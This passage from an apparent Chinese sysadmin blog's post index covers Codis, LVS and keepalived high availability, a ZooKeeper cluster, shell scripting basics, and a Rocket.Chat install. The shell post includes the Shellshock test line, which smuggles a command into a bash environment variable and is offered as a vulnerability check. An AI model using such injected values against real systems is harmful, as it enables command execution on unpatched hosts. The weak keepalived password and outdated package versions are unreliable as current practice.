priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 10.0.10.50&#x2F;24 &#125;&#125;virtual_server 10.0.10.50 19000 &#123; delay_loop 6 lb_algo wrr lb_kind DR nat_mask 255.255.255.0 persistence_timeout 50 protocol TCP real_server 10.0.10.44 19000 &#123; weight 1 TCP_CHECK &#123; connect_timeout 8 nb_get_retry 3 delay_before_retry 3 connect_port 19000 &#125; &#125; real_server 10.0.10.45 19000 &#123; weight 1 TCP_CHECK &#123; connect_timeout 8 nb_get_retry 3 delay_before_retry 3 connect_port 19000 &#125; &#125;&#125; 分别启动 1234&gt;&#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf vim &#x2F;etc&#x2F;keepalived&#x2F;keepalived.confsystemctl start keepalivedsystemctl status keepalived codis-proxy配置-【在2台lvs后端机codis-proxy上配置】 12345678910步骤1：在lo网卡绑定VIP地址（ip）步骤2：修改内核参数抑制ARP响应ip addr add 192.168.56.10&#x2F;32 dev locat &gt;&gt;&#x2F;etc&#x2F;sysctl.conf&lt;&lt;EOFnet.ipv4.conf.all.arp_ignore &#x3D; 1net.ipv4.conf.all.arp_announce &#x3D; 2net.ipv4.conf.lo.arp_ignore &#x3D; 1net.ipv4.conf.lo.arp_announce &#x3D; 2EOFsysctl -p 检查LVS集群 1ipvsadm -ln 最后把HA的IP和端口给研发即可 123给研发正式启用前，务必进行多次压测本测试环境中，Codis HA地址&#x2F;端口为：10.0.10.50:19000 压力测试12345压力测试命令：&#x2F;usr&#x2F;local&#x2F;codis.&#x2F;bin&#x2F;redis-benchmark -h HA_IP地址 -p HA_Port -q -n 1000000 -c 20 -d 100k如上Dashboard效果图","categories":[],"tags":[{"name":"zookeeper","slug":"zookeeper","permalink":"https://garywu520.github.io/tags/zookeeper/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"codis","slug":"codis","permalink":"https://garywu520.github.io/tags/codis/"},{"name":"codis集群","slug":"codis集群","permalink":"https://garywu520.github.io/tags/codis%E9%9B%86%E7%BE%A4/"},{"name":"memcache","slug":"memcache","permalink":"https://garywu520.github.io/tags/memcache/"}]},{"title":"zookeeper集群部署","slug":"zookeeper集群部署","date":"2017-11-28T06:13:13.000Z","updated":"2017-11-29T07:42:34.858Z","comments":true,"path":"2017/11/28/zookeeper集群部署/","link":"","permalink":"https://garywu520.github.io/2017/11/28/zookeeper%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/","excerpt":"1因为公司的业务发展，需要搭建codis集群（一个由国内豌豆荚开发的redis集群解决方案），但是codis集群是依赖与zookeeper集群的。所以这篇文章，我们主要介绍有关zookeeper集群的搭建。 Zookeeper介绍","text":"1因为公司的业务发展，需要搭建codis集群（一个由国内豌豆荚开发的redis集群解决方案），但是codis集群是依赖与zookeeper集群的。所以这篇文章，我们主要介绍有关zookeeper集群的搭建。 Zookeeper介绍 12345zookeeper是一个分布式的开源框架，它能很好的管理集群，而且提供协调分布式应用的基本服务。它向外部应用暴露一组通用服务——分布式同步（Distributed Synchronization）、命名服务（Naming Service）、集群维护（Group Maintenance）等，简化分布式应用协调及其管理的难度，提供高性能的分布式服务。zookeeper本身可以以standalone模式（单节点状态）安装运行，不过它的长处在于通过分布式zookeeper集群（一个leader，多个follower），基于一定的策略来保证zookeeper集群的稳定性和可用性，从而实现分布式应用的可靠性。 zookeeper集群节点个数 12345一个zookeeper集群需要运行几个zookeeper节点呢？zookeeper节点部署的越多，服务的可靠性也就越高。当然建议最好是部署奇数个，偶数个不是不可以。但是zookeeper集群是以宕机个数过半才会让整个集群宕机的，所以奇数个集群更佳。你需要给每个zookeeper 1G左右的内存，如果可能的话，最好有独立的磁盘，因为独立磁盘可以确保zookeeper是高性能的。如果你的集群负载很重，不要把zookeeper和RegionServer运行在同一台机器上面，就像DataNodes和TaskTrackers一样。 安装部署 环境 12OS: CentOS7 数量: 3台 安装jdk 123yum search jdk |grep openjdkyum install -y java-1.6.0-openjdk.x86_64java -version #查看java版本 安装zookeeper 1234567891011下载最新稳定版zookeeperwget https:&#x2F;&#x2F;archive.apache.org&#x2F;dist&#x2F;zookeeper&#x2F;stable&#x2F;zookeeper-3.4.10.tar.gz解压tar -xf zookeeper-3.4.10.tar.gz -C &#x2F;usr&#x2F;local&#x2F;cd &#x2F;usr&#x2F;local&#x2F;mv zookeeper-3.4.10 zookeeperuseradd zookeeper -s &#x2F;sbin&#x2F;nologin -Mchown -R zookeeper:zookeeper zookeepercd zookeepercp conf&#x2F;zoo_sample.cfg conf&#x2F;zoo.cfg 123456配置zookeeper环境变量tail -1 &#x2F;etc&#x2F;profileexport PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;binsource &#x2F;etc&#x2F;profileenv |grep zookeeper 单机启动zookeeper测试 123456789101112在任意一台服务器上启动zookeeperzkServer.sh start #启动zookeeperss -lntup |grep 2181 #查看端口cat .&#x2F;zookeeper.out #查看日志[root@localhost ~]# zkServer.sh statusZooKeeper JMX enabled by defaultUsing config: &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfgMode: standalone可以很明显的看到zookeeper监听的是TCP的2181端口，是以standalone单机模式运行的，而且通过zookeeper日志也可以看到目前zookeeper是正常运行的。zkServer.sh stop #停止单机模式zookeeper服务 集群部署123zookeeper搭建完毕后，我们现在来配置zookeeper集群。注意：在搭建zookeeper集群时，一定要停止已经启动的zookeeper。 修改zookeeper配置文件 123456789101112131415161718创建日志和数据存放目录并授权[root@localhost conf]# mkdir &#x2F;var&#x2F;log&#x2F;zookeeper -p[root@localhost conf]# chown -R zookeeper:zookeeper &#x2F;var&#x2F;log&#x2F;zookeeper[root@localhost zookeeper]# mkdir &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;data -p[root@localhost zookeeper]# chown -R zookeeper.zookeeper &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;datacd &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;conf&#x2F;编辑配置文件zoo.cfg[root@localhost conf]# egrep -v &quot;^#|^$&quot; zoo.cfg tickTime&#x3D;2000initLimit&#x3D;10syncLimit&#x3D;5dataDir&#x3D;&#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;dataclientPort&#x3D;2181dataLogDir&#x3D;&#x2F;var&#x2F;log&#x2F;zookeeperserver.1&#x3D; 10.0.10.57:2888:3888server.2&#x3D; 10.0.10.58:2888:3888server.3&#x3D; 10.0.10.59:2888:3888 123456789101112131415配置文件-参数说明:tickTime这个时间是作为zookeeper服务器之间或客户端与服务器之间维持心跳的时间间隔,也就是说每个tickTime时间就会发送一个心跳。initLimit这个配置项是用来配置zookeeper接受客户端（这里所说的客户端不是用户连接zookeeper服务器的客户端,而是zookeeper服务器集群中连接到leader的follower 服务器）初始化连接时最长能忍受多少个心跳时间间隔数。当已经超过10个心跳的时间（也就是tickTime）长度后 zookeeper 服务器还没有收到客户端的返回信息,那么表明这个客户端连接失败。总的时间长度就是 10*2000&#x3D;20秒。syncLimit这个配置项标识leader与follower之间发送消息,请求和应答时间长度,最长不能超过多少个tickTime的时间长度,总的时间长度就是5*2000&#x3D;10秒。dataDir顾名思义就是zookeeper保存数据的目录,默认情况下zookeeper将写数据的日志文件也保存在这个目录里；clientPort这个端口就是客户端连接Zookeeper服务器的端口,Zookeeper会监听这个端口接受客户端的访问请求；server.A&#x3D;B:C:D中的A是一个数字,表示这个是第几号服务器,B是这个服务器的IP地址，C第一个端口用来集群成员的信息交换,表示这个服务器与集群中的leader服务器交换信息的端口，D是在leader挂掉时专门用来进行选举leader所用的端口。 创建ServerID标识 12345678910注：zookeeper集群模式下还要配置一个myid文件,这个文件需要放在dataDir目录下。(1)在10.0.10.57服务器上创建myid文件,并设置值为1,同时需要与zoo.cfg文件里面的server.1对应 echo &quot;1&quot; &gt; &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;data&#x2F;myid (2)在10.0.10.58服务器上创建myid文件,并设置值为2,同时需要与zoo.cfg文件里面的server.2对应 echo &quot;2&quot; &gt; &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;data&#x2F;myid (3)在10.0.10.59服务器上创建myid文件,并设置值为3,同时需要与zoo.cfg文件里面的server.3对应 echo &quot;3&quot; &gt; &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;data&#x2F;myid 启动并查看zookeeper集群 12345分别启动三台zookeeper服务器服务zkServer.sh start在任意一台查看zookeeper集群服务状态(注：需要所有成员服务器均启动服务后才能查看，否则会报错)zkServer.sh status 12345678910111213141516171819IP地址: 10.0.10.57&#x2F;24[root@localhost ~]# zkServer.sh statusZooKeeper JMX enabled by defaultUsing config: &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfgMode: followerIP地址: 10.0.10.58&#x2F;24[root@localhost ~]# zkServer.sh statusZooKeeper JMX enabled by defaultUsing config: &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfgMode: leaderIP地址: 10.0.10.59&#x2F;24[root@localhost ~]# zkServer.sh statusZooKeeper JMX enabled by defaultUsing config: &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfgMode: follower出现以上信息说明：zookeeper集群已经成功部署。 连接zookeeper集群 12345678910111213141516对于客户端来说，zookeeper集群是一个整体，连接到zookeeper集群实际上感觉在独享整个集群的服务，所以，你可以在任何一个结点上建立到服务集群的连接。例如：在其中10.0.10.57节点使用zkCli.sh命令连接zookeeper服务器10.0.10.59:2181,如下[root@localhost ~]# zkCli.sh -server 10.0.10.59:2181Connecting to 10.0.10.59:21812017-11-28 02:12:42,232 [myid:] - INFO [main:Environment@100] - Client environment:zookeeper.version&#x3D;3.4.10-39d3a4f269333c922ed3db283be479f9deacaa0f, built on 03&#x2F;23&#x2F;2017 10:13 GMT2017-11-28 02:12:42,238 [myid:] - INFO [main:Environment@100] - Client environment:host.name&#x3D;localhostWatchedEvent state:SyncConnected type:None path:null[zk: 10.0.10.59:2181(CONNECTED) 0] [zk: 10.0.10.59:2181(CONNECTED) 0] ls &#x2F; [zookeeper][zk: 10.0.10.59:2181(CONNECTED) 1] [zk: 10.0.10.59:2181(CONNECTED) 1]到此有关zookeeper集群搭建就完全结束。 开机自启 脚本如下： 1234567891011#!&#x2F;bin&#x2F;bash #chkconfig:2345 20 90 #description:zookeeper #processname:zookeepercase $1 in start) &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh start;; stop) &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh stop;; status) &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh status;; restart) &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh restart;; *) echo &quot;require start|stop|status|restart&quot; ;; esac chkconfig –add zookeeper &amp;&amp; chkconfig –list |grep zookeeper 参考： 烂泥行天下","categories":[],"tags":[{"name":"zookeeper","slug":"zookeeper","permalink":"https://garywu520.github.io/tags/zookeeper/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"codis","slug":"codis","permalink":"https://garywu520.github.io/tags/codis/"}]},{"title":"shell高级编程-进阶1","slug":"shell高级编程-进阶1","date":"2017-11-25T07:38:40.000Z","updated":"2017-12-02T01:43:49.690Z","comments":true,"path":"2017/11/25/shell高级编程-进阶1/","link":"","permalink":"https://garywu520.github.io/2017/11/25/shell%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B-%E8%BF%9B%E9%98%B61/","excerpt":"基础 123当在命令行执行一个 ls命令，实质上是 echo了一个ls字符，然后交给bash处理，像下面这样：[root@web01 ~]# echo ls|bashanaconda-ks.cfg","text":"基础 123当在命令行执行一个 ls命令，实质上是 echo了一个ls字符，然后交给bash处理，像下面这样：[root@web01 ~]# echo ls|bashanaconda-ks.cfg 强大shell脚本组成 1命令、变量和流程控制语句 脚本编写-考虑点 12345(1) 有没有脚本放在同一目录(2) 权限: 用哪个用户执行文件(加判断)(3) 清空错文件怎么办（加判断）(4) 错误提示：有没有执行成功知不知道（脚本执行完文字输出）(5) 脚本通用性(即换个系统能否执行？环境判断) shell脚本的建立和执行 123脚本存放命令：[root@web01 ~]# mkdir -p &#x2F;server&#x2F;scripts[root@web01 ~]# cd &#x2F;server&#x2F;scripts 12345#!&#x2F;bin&#x2F;bash#这里是注释echo &#96;hello world!&#96; #这里是注释 sh与bash有区别吗？ 1通过命令:ls -l &#96;which sh&#96; 可以看到sh命令是bash的软链,所以没有区别 检查bash是否有漏洞 123env x&#x3D;&#39;() &#123; :;&#125;; echo be careful&#39; bash -c &quot;echo this is a test&quot;若出现两行结果就说明bash存在漏洞。 编辑shell文件自动添加shell注释等信息 [root@zyops ~]# cat .vimrc 12345678910111213141516autocmd BufNewFile *.py,*.cc,*.sh,*.java exec &quot;:call SetTitle()&quot;func SetTitle() if expand(&quot;%:e&quot;) &#x3D;&#x3D; &#39;sh&#39; call setline(1,&quot;#!&#x2F;bin&#x2F;bash&quot;) call setline(2, &quot;##############################################################&quot;) call setline(3, &quot;# File Name: &quot;.expand(&quot;%&quot;)) call setline(4, &quot;# Version: V1.0&quot;) call setline(5, &quot;# Author: Gary Wu&quot;) call setline(6, &quot;# Organization: https:&#x2F;&#x2F;wuyanteng.github.io&quot;) call setline(7, &quot;# Created Time : &quot;.strftime(&quot;%F %T&quot;)) call setline(8, &quot;# Description:&quot;) call setline(9, &quot;##############################################################&quot;) call setline(10, &quot;&quot;) endif endfunc 使用 1在&#x2F;server&#x2F;scripts目录，创建 xxx.sh即可 shell脚本执行顺序 12从上到下从左到右 shell脚本执行 123456789#执行shell方式一：sh test.sh(推荐使用) 或 bash test.sh方式二：source test.sh 或 . test.sh区别：sh 脚本名称 #是创建一个新的进程(窗口)执行文件中的命令source 脚本名称 #直接在当前进程(窗口)执行文件中的命令共同点：都能执行脚本命令 变量12全部变量（又名环境变量）局部变量（普通变量） 12查看系统全局变量env 定义全局变量的方法： 12345678910111213export A&#x3D;1echo $Aenv|grep A #查看环境变量#以上操作只在当前shell生效，如果需要长期生效需要追加到&#x2F;etc&#x2F;profile中echo &quot;export A&#x3D;1&quot; &gt;&gt;&#x2F;etc&#x2F;profilesource &#x2F;etc&#x2F;profile#临时删除环境变量unset A#永久删除环境变量在&#x2F;etc&#x2F;profile中删除并source即可 为什么要定义变量？ 1多次被重复使用的命令就可以使用变量替代 shell特殊变量 位置变量 12345678echo $? #检查上一个命令执行结果，0表示成功，1表示失败echo $0 # 显示当前执行脚本名称(显示sh命令后接的文件名)；echo $1 $2 .... $n (n 为无穷大的值) #表示脚本后面接的参数，按位置数过去echo $# #输出命令行传参的个数,用法如: [$# -eq 2]echo &quot;$@&quot; #获取命令行全部传入参数[推荐使用]echo $@ # 获取命令行全部传入参数[不推荐使用]echo $* # 获取命令行全部传入参数[不推荐使用] 12345678910111213141516171819echo $0echo &quot;第1个参数：&quot; $1echo &quot;第2个参数：&quot; $2echo &quot;第3个参数：&quot; $3echo &quot;第4个参数：&quot; $4echo &quot;第5个参数：&quot; $&#123;11&#125;echo &quot;传入参数总数量：&quot; $#echo &quot;获取全部传入参数：&quot; “$@”脚本执行结果：[root@web01 scripts]# sh test.sh 1 2 3 4 5 6 7 8 9 10 11test.sh第1个参数： 1第2个参数： 2第3个参数： 3第4个参数： 4第5个参数： 11传入参数总数量： 11获取全部传入参数： “1 2 3 4 5 6 7 8 9 10 11”","categories":[],"tags":[{"name":"SHELL","slug":"SHELL","permalink":"https://garywu520.github.io/tags/SHELL/"},{"name":".vimrc自动添加shell注释","slug":"vimrc自动添加shell注释","permalink":"https://garywu520.github.io/tags/vimrc%E8%87%AA%E5%8A%A8%E6%B7%BB%E5%8A%A0shell%E6%B3%A8%E9%87%8A/"}]},{"title":"LVS精讲","slug":"LVS精讲","date":"2017-11-25T01:48:03.000Z","updated":"2017-11-25T07:31:55.875Z","comments":true,"path":"2017/11/25/LVS精讲/","link":"","permalink":"https://garywu520.github.io/2017/11/25/LVS%E7%B2%BE%E8%AE%B2/","excerpt":"为什么要学LVS？ 123当并发超过Nginx上限，就可以使用LVS了。而日1000-2000W PV或并发请求1万以下都可以考虑用Nginx大型门户网站电商网站常用LVS","text":"为什么要学LVS？ 123当并发超过Nginx上限，就可以使用LVS了。而日1000-2000W PV或并发请求1万以下都可以考虑用Nginx大型门户网站电商网站常用LVS LVS介绍 1234567LVS是Linux Virtual Server的简写，即Linux虚拟服务器。官网：http:&#x2F;&#x2F;linuxvirtualserver.org&#x2F;LVS项目介绍 http:&#x2F;&#x2F;www.linuxvirtualserver.org&#x2F;zh&#x2F;lvs1.html LVS集群的体系结构 http:&#x2F;&#x2F;www.linuxvirtualserver.org&#x2F;zh&#x2F;lvs2.html LVS集群中的IP负载均衡技术 http:&#x2F;&#x2F;www.linuxvirtualserver.org&#x2F;zh&#x2F;lvs3.htmlLVS集群的负载调度 http:&#x2F;&#x2F;www.linuxvirtualserver.org&#x2F;zh&#x2F;lvs4.html LVS内核模块ip_vs 1234LVS无需安装，其管理工具叫做ipvsadm和keepalived。区别：ipvsadm是通过命令行管理，而keepalived读取配置文件管理注：ip_vs内核模块已经集成到了2.6及以后的kernel内核当中，也就意味着发行版自带无需再安装。 环境 12345678910114台服务器，如下：192.168.56.11 LB01192.168.56.12 LB02192.168.56.13 Web01192.168.56.14 Web02web01和web02部署完成nginx，启动服务并可访问，要求访问结果如下：curl http:&#x2F;&#x2F;192.168.56.13&#x2F;index.htmlweb01curl http:&#x2F;&#x2F;192.168.56.14&#x2F;index.htmlweb02 LVS集群部署lvs01上操作 1234567891011121314#查看lvs模块lsmod |grep ip_vs#默认没有加载模块，所以需要安装管理工具激活yum -y install ipvsadm#查看管理工具ipvsadm状态ipvsadm#再次查看lvs模块lsmod |grep ip_vsip_vs 141092 0 nf_conntrack 111302 1 ip_vslibcrc32c 12644 2 xfs,ip_vs 如下采用DR直接模式 123456789101112131415161718192021222324252627282930313233#添加虚拟VIP地址(注意掩码)ip addr add 192.168.56.3&#x2F;24 dev eth0 或vim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0 添加如下行：IPADDR1&#x3D;&quot;192.168.56.10&quot;重启网卡# ip addr 查看#清除原有规则ipvsadm -C #配置超时时间ipvsadm --set 30 5 60 #添加VIP网卡端口ipvsadm -A -t 192.168.56.10:80 -s wrr -p 20#关联后端real serveripvsadm -a -t 192.168.56.10:80 -r 192.168.56.13:80 -g -w 1 ipvsadm -a -t 192.168.56.10:80 -r 192.168.56.14:80 -g -w 1 #查看参数帮助ipvsadm --help#查看ipvsadm配置[root@linux-node1 ~]# ipvsadm -lnIP Virtual Server version 1.2.1 (size&#x3D;4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 192.168.56.10:80 wrr persistent 20 -&gt; 192.168.56.13:80 Route 1 0 0 -&gt; 192.168.56.14:80 Route 1 0 0 分别在web01和web02操作 1234567891011步骤1：在lo网卡绑定VIP地址（ip）步骤2：修改内核参数抑制ARP响应ip addr add 192.168.56.10&#x2F;32 dev locat &gt;&gt;&#x2F;etc&#x2F;sysctl.conf&lt;&lt;EOFnet.ipv4.conf.all.arp_ignore &#x3D; 1net.ipv4.conf.all.arp_announce &#x3D; 2net.ipv4.conf.lo.arp_ignore &#x3D; 1net.ipv4.conf.lo.arp_announce &#x3D; 2EOFsysctl -p 浏览器访问测试 12345http:&#x2F;&#x2F;192.168.56.10&#x2F; 访问结果问题如下：问题1：负载结果不像nginx负载那么明显问题2： 使用抓包工具，发现进行通信的返回IP地址与MAC地址不匹配 LVS工作模式 LVS名词 DR直接路由模式 12345678910要求：LB服务器与real server服务器必须在同一局域网。特点：同一个局域网是通过MAC地址进行数据包发送接收的。另,为了解决LVS发送数据包给web01，web01根据IP地址判断不属于发送自己会把该数据包丢弃，所以我们在web01和web02的lo回环网卡配置了VIP地址，来让其接收数据包。缺点：浪费公网IP地址。但如果不使用公网IP地址而使用网关进行地址转换势必会给网关造成瓶颈压力。注：(1)LVS DR模式工作在2层数据链路层(主要协议：ARP,即MAC地址转发)，DR模式它改不了端口，所以VIP:80后端real server也必须是80端口。(2)我们说LVS工作在四层，其实指的是LVS其他的工作模式,而非DR模式。 Real Server为什么要修改内核参数抑制ARP响应？ 12DR模式需要关闭内核arp响应，确保收到的arp信息最为准确。除此之外，要保证VIP IP地址孤立，所谓孤立就配置其掩码为32即可。 1234567891011基础知识：ARP协议作用是：ARP通过广播方式将IP地址转为MAC地址。为了提升IP转换MAC地址的效率，系统会进行ARP缓存，减少广播风暴。当LB01宕机切换到LB02时，ARP缓存表MAC地址并没有及时变更会导致服务器无法上网,所以需要及时更新arp缓存。所以需要调用arping命令进行主动更新。#查看arp缓存命令arp -n#arp ping命令解析MAC地址arping -c 1 -I eth0 192.168.56.14 LVS集群工作模式 1234DR(Direct Routing)：直接路由模式NAT：NAT模式（LB负载均衡服务器做NAT会成为性能瓶颈）TUNNEL：隧道模式FULLNAT(淘宝请原作者再次开发的模式) LVS（负载均衡）+keepalived（高可用）集群 LVS01和web02上操作 1234567891011121314#查看lvs模块lsmod |grep ip_vs#默认没有加载模块，所以需要安装管理工具激活yum -y install ipvsadm#查看管理工具ipvsadm状态ipvsadm#再次查看lvs模块lsmod |grep ip_vsip_vs 141092 0 nf_conntrack 111302 1 ip_vslibcrc32c 12644 2 xfs,ip_vs 分别在lb01和lb02上安装keepalived 12#安装keepalivedyum install -y keepalived 12#配置keepalivedvim &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf lb01配置文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647global_defs &#123; router_id LVS_01 #每个配置文件的router_id都不同&#125;vrrp_instance VI_1 &#123; state MASTER #配置标识 interface eth0 virtual_router_id 51 #同一个LVS集群virtual_router_id相同 priority 150 #优先级要比backup高 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; #配置虚拟VIP 192.168.56.10&#x2F;24 &#125;&#125;virtual_server 192.168.56.10 80 &#123; delay_loop 6 lb_algo wrr lb_kind DR nat_mask 255.255.255.0 persistence_timeout 50 protocol TCP real_server 192.168.56.13 80 &#123; weight 1 TCP_CHECK &#123; #配置健康检查，检查失败则将本节点踢出集群 connect_timeout 8 nb_get_retry 3 delay_before_retry 3 connect_port 80 &#125; &#125; real_server 192.168.56.14 80 &#123; weight 1 TCP_CHECK &#123; #配置健康检查，检查失败则将本节点踢出集群 connect_timeout 8 nb_get_retry 3 delay_before_retry 3 connect_port 80 &#125; &#125;&#125; lb02配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748global_defs &#123; router_id LVS_02&#125;vrrp_instance VI_1 &#123; state BACKUP interface eth0 virtual_router_id 51 priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 192.168.56.10&#x2F;24 &#125;&#125;#下面的部分与lb01完全一致。virtual_server 192.168.56.10 80 &#123; delay_loop 6 lb_algo wrr lb_kind DR nat_mask 255.255.255.0 persistence_timeout 50 protocol TCP real_server 192.168.56.13 80 &#123; weight 1 TCP_CHECK &#123; connect_timeout 8 nb_get_retry 3 delay_before_retry 3 connect_port 80 &#125; &#125; real_server 192.168.56.14 80 &#123; weight 1 TCP_CHECK &#123; connect_timeout 8 nb_get_retry 3 delay_before_retry 3 connect_port 80 &#125; &#125;&#125; 分别启动 12345&gt;&#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf vim &#x2F;etc&#x2F;keepalived&#x2F;keepalived.confsystemctl start keepalivedsystemctl status keepalivedip addr #查看VIP地址是否存在 Web服务器配置 web01和web02配置如下： 1234567891011步骤1：在lo网卡绑定VIP地址（ip）步骤2：修改内核参数抑制ARP响应ip addr add 192.168.56.10&#x2F;32 dev locat &gt;&gt;&#x2F;etc&#x2F;sysctl.conf&lt;&lt;EOFnet.ipv4.conf.all.arp_ignore &#x3D; 1net.ipv4.conf.all.arp_announce &#x3D; 2net.ipv4.conf.lo.arp_ignore &#x3D; 1net.ipv4.conf.lo.arp_announce &#x3D; 2EOFsysctl -p 检查集群 1ipvsadm -ln 关于排错 1LVS集成到了kernel内核中，无日志可以查看，所以需要按照正确的部署方式逐一排查。 写在最后加深印象123注：(1)LVS DR模式工作在2层数据链路层(主要协议：ARP,即MAC地址转发)，DR模式它改不了端口，所以VIP:80后端real server也必须是80端口。(2)我们说LVS工作在四层，其实指的是LVS其他的工作模式,而非DR模式。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"lvs","slug":"lvs","permalink":"https://garywu520.github.io/tags/lvs/"},{"name":"负载均衡","slug":"负载均衡","permalink":"https://garywu520.github.io/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"},{"name":"keepalived","slug":"keepalived","permalink":"https://garywu520.github.io/tags/keepalived/"},{"name":"4层负载均衡","slug":"4层负载均衡","permalink":"https://garywu520.github.io/tags/4%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"},{"name":"DR模式","slug":"DR模式","permalink":"https://garywu520.github.io/tags/DR%E6%A8%A1%E5%BC%8F/"}]},{"title":"企业IM聊天系统-Rocket.Chat","slug":"企业IM聊天系统-Rocket-Chat","date":"2017-11-24T07:46:10.000Z","updated":"2018-04-24T07:49:03.345Z","comments":true,"path":"2017/11/24/企业IM聊天系统-Rocket-Chat/","link":"","permalink":"https://garywu520.github.io/2017/11/24/%E4%BC%81%E4%B8%9AIM%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F-Rocket-Chat/","excerpt":"123456Rocket.Chat 主要功能：群组聊天，直接通信，私聊群，桌面通知，媒体嵌入，链接预览，文件上传，语音&#x2F;视频 聊天，截图等等。Rocket.Chat 原生支持 Windows，Mac OS X ，Linux，iOS 和 Android 平台。Rocket.Chat 通过 hubot 集成了非常流行的服务，比如 GitHub，GitLab，Confluence，JIRA 等等。支持LDAP接入，支持SSL。高级的特性包括：OTR 消息，XMPP 多用户聊天，Kerberos 认证，p2p 文件分享等等。","text":"123456Rocket.Chat 主要功能：群组聊天，直接通信，私聊群，桌面通知，媒体嵌入，链接预览，文件上传，语音&#x2F;视频 聊天，截图等等。Rocket.Chat 原生支持 Windows，Mac OS X ，Linux，iOS 和 Android 平台。Rocket.Chat 通过 hubot 集成了非常流行的服务，比如 GitHub，GitLab，Confluence，JIRA 等等。支持LDAP接入，支持SSL。高级的特性包括：OTR 消息，XMPP 多用户聊天，Kerberos 认证，p2p 文件分享等等。 参考：官方部署文档 添加epel扩展源1rpm -Uvh http:&#x2F;&#x2F;download.fedoraproject.org&#x2F;pub&#x2F;epel&#x2F;epel-release-latest-7.noarch.rpm 安装MongDB12345678vim &#x2F;etc&#x2F;yum.repos.d&#x2F;mongodb-org.repo[mongodb-org-3.4]name&#x3D;MongoDB Repositorybaseurl&#x3D;https:&#x2F;&#x2F;repo.mongodb.org&#x2F;yum&#x2F;redhat&#x2F;$releasever&#x2F;mongodb-org&#x2F;3.4&#x2F;x86_64&#x2F;gpgcheck&#x3D;1enabled&#x3D;1gpgkey&#x3D;https:&#x2F;&#x2F;www.mongodb.org&#x2F;static&#x2F;pgp&#x2F;server-3.4.asc 123yum -y install mongodb-orgsystemctl start mongodsystemctl enable mongod 安装node.js123456wget https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v0.10.40&#x2F;node-v0.10.40-linux-x64.tar.gztar -C &#x2F;usr&#x2F;local --strip-components 1 -zxvf node-v0.10.40-linux-x64.tar.gzyum -y install nodejs npmnpm install -g inherits nn 4.5yum -y install curl GraphicsMagick gcc-c++ 安装rocket.chat12345678910111213cd &#x2F;optcurl -L https:&#x2F;&#x2F;download.rocket.chat&#x2F;stable -o rocket.chat.tgztar zxvf rocket.chat.tgzmv bundle Rocket.Chatcd Rocket.Chat&#x2F;programs&#x2F;server npm installcd &#x2F;opt&#x2F;Rocket.Chatexport ROOT_URL&#x3D;http:&#x2F;&#x2F;10.0.10.50:3000&#x2F;export MONGO_URL&#x3D;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;rocketchatexport PORT&#x3D;3000node main.js 配置开机启动1vi &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rocketchat.service 123456789101112[Unit]Description&#x3D;The Rocket.Chat serverAfter&#x3D;network.target remote-fs.target nss-lookup.target nginx.target mongod.target[Service]ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;node &#x2F;opt&#x2F;Rocket.Chat&#x2F;main.jsStandardOutput&#x3D;syslogStandardError&#x3D;syslogSyslogIdentifier&#x3D;rocketchatUser&#x3D;rootEnvironment&#x3D;MONGO_URL&#x3D;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;rocketchat ROOT_URL&#x3D;http:&#x2F;&#x2F;10.0.10.50:3000&#x2F; PORT&#x3D;3000[Install]WantedBy&#x3D;multi-user.target 123systemctl enable rocketchat.servicesystemctl start rocketchat.servicesystemctl startus rocketchat.service 